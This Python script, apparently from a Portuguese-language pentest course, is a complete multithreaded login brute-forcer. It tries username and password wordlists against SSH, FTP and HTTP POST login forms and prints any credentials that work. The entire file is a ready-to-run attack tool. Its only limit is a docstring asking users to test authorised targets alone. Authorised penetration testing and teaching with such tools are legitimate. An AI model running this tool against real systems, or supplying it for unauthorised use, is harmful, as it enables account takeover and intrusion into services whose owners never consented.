#!/usr/bin/env python3
"""
brute_forcer - brute force de login em servicos de rede.

Uso educacional / pentest autorizado (Solyd). Use apenas em alvos
que voce tem permissao explicita por escrito para testar.
"""
from __future__ import annotations

import argparse
import queue
import sys
import threading
import time
from dataclasses import dataclass
from typing import Callable, Iterator, Optional


@dataclass
class Attempt:
    user: str
    password: str


@dataclass
class Result:
    user: str
    password: str


# ---------------------------------------------------------------------------
# Protocolos (cada um recebe host/porta/timeout e retorna um callable que
# testa uma credencial e devolve True em caso de sucesso).
# ---------------------------------------------------------------------------

def make_ssh_checker(host: str, port: int, timeout: float) -> Callable[[Attempt], bool]:
    try:
        import paramiko
    except ImportError:  # pragma: no cover
        sys.exit("paramiko nao instalado. Rode: pip install -r requirements.txt")

    import logging
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    def check(att: Attempt) -> bool:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host,
                port=port,
                username=att.user,
                password=att.password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=timeout,
                auth_timeout=timeout,
            )
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            # erro de rede/timeout: nao conta como sucesso
            return False
        finally:
            client.close()

    return check


def make_ftp_checker(host: str, port: int, timeout: float) -> Callable[[Attempt], bool]:
    import ftplib

    def check(att: Attempt) -> bool:
        ftp = ftplib.FTP()
        try:
            ftp.connect(host, port, timeout=timeout)
            ftp.login(att.user, att.password)
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False
        finally:
            try:
                ftp.close()
            except Exception:
                pass

    return check


def make_http_post_checker(
    host: str,
    port: int,
    timeout: float,
    path: str,
    user_field: str,
    pass_field: str,
    fail_text: str,
) -> Callable[[Attempt], bool]:
    try:
        import requests
    except ImportError:  # pragma: no cover
        sys.exit("requests nao instalado. Rode: pip install -r requirements.txt")

    scheme = "https" if port == 443 else "http"
    url = f"{scheme}://{host}:{port}{path}"

    def check(att: Attempt) -> bool:
        data = {user_field: att.user, pass_field: att.password}
        try:
            resp = requests.post(url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        # sucesso = o texto de falha NAO aparece na resposta
        return fail_text not in resp.text

    return check


PROTOCOLS = {"ssh": 22, "ftp": 21, "http-post": 80}


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

def read_lines(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        return [ln.rstrip("\n") for ln in fh if ln.strip()]


def iter_attempts(users: list[str], passwords: list[str]) -> Iterator[Attempt]:
    for user in users:
        for pwd in passwords:
            yield Attempt(user, pwd)


def run(
    checker: Callable[[Attempt], bool],
    attempts: Iterator[Attempt],
    threads: int,
    delay: float,
    stop_on_first: bool,
) -> list[Result]:
    work: "queue.Queue[Optional[Attempt]]" = queue.Queue(maxsize=threads * 2)
    results: list[Result] = []
    lock = threading.Lock()
    stop = threading.Event()
    tried = [0]

    def worker() -> None:
        while not stop.is_set():
            att = work.get()
            if att is None:
                work.task_done()
                return
            try:
                ok = checker(att)
                with lock:
                    tried[0] += 1
                if ok:
                    with lock:
                        results.append(Result(att.user, att.password))
                        print(f"\n[+] SUCESSO  {att.user}:{att.password}")
                    if stop_on_first:
                        stop.set()
            finally:
                work.task_done()
            if delay:
                time.sleep(delay)

    pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in pool:
        t.start()

    try:
        for att in attempts:
            if stop.is_set():
                break
            work.put(att)
            with lock:
                n = tried[0]
            print(f"\r[*] tentativas: {n}", end="", flush=True)
    except KeyboardInterrupt:
        stop.set()
        print("\n[!] interrompido pelo usuario")

    for _ in pool:
        work.put(None)
    for t in pool:
        t.join()

    print(f"\r[*] tentativas: {tried[0]}        ")
    return results


def build_checker(args: argparse.Namespace) -> Callable[[Attempt], bool]:
    if args.protocol == "ssh":
        return make_ssh_checker(args.host, args.port, args.timeout)
    if args.protocol == "ftp":
        return make_ftp_checker(args.host, args.port, args.timeout)
    if args.protocol == "http-post":
        return make_http_post_checker(
            args.host, args.port, args.timeout,
            args.path, args.user_field, args.pass_field, args.fail_text,
        )
    raise ValueError(args.protocol)


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Brute force de login (uso autorizado apenas).",
    )
    p.add_argument("protocol", choices=PROTOCOLS, help="protocolo alvo")
    p.add_argument("host", help="host/IP do alvo autorizado")
    p.add_argument("-p", "--port", type=int, help="porta (default por protocolo)")

    g = p.add_argument_group("credenciais")
    g.add_argument("-u", "--user", help="usuario unico")
    g.add_argument("-U", "--userlist", help="arquivo com usuarios")
    g.add_argument("-P", "--passlist", required=True, help="arquivo com senhas")

    e = p.add_argument_group("execucao")
    e.add_argument("-t", "--threads", type=int, default=8, help="threads (default 8)")
    e.add_argument("--delay", type=float, default=0.0, help="delay por tentativa (s)")
    e.add_argument("--timeout", type=float, default=8.0, help="timeout de conexao (s)")
    e.add_argument("--all", action="store_true", help="nao parar no primeiro sucesso")

    h = p.add_argument_group("http-post")
    h.add_argument("--path", default="/login", help="caminho do form")
    h.add_argument("--user-field", default="username", help="nome do campo usuario")
    h.add_argument("--pass-field", default="password", help="nome do campo senha")
    h.add_argument("--fail-text", default="invalid", help="texto presente quando falha")

    args = p.parse_args(argv)
    if args.port is None:
        args.port = PROTOCOLS[args.protocol]
    if not args.user and not args.userlist:
        p.error("informe -u/--user ou -U/--userlist")
    return args


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(argv)

    users = read_lines(args.userlist) if args.userlist else [args.user]
    passwords = read_lines(args.passlist)

    print(f"[*] alvo     : {args.protocol}://{args.host}:{args.port}")
    print(f"[*] usuarios : {len(users)}  senhas: {len(passwords)}  "
          f"combinacoes: {len(users) * len(passwords)}")
    print(f"[*] threads  : {args.threads}  delay: {args.delay}s\n")

    checker = build_checker(args)
    attempts = iter_attempts(users, passwords)
    results = run(
        checker, attempts,
        threads=args.threads,
        delay=args.delay,
        stop_on_first=not args.all,
    )

    if results:
        print(f"\n[=] {len(results)} credencial(is) encontrada(s):")
        for r in results:
            print(f"    {r.user}:{r.password}")
        return 0
    print("\n[-] nenhuma credencial encontrada")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
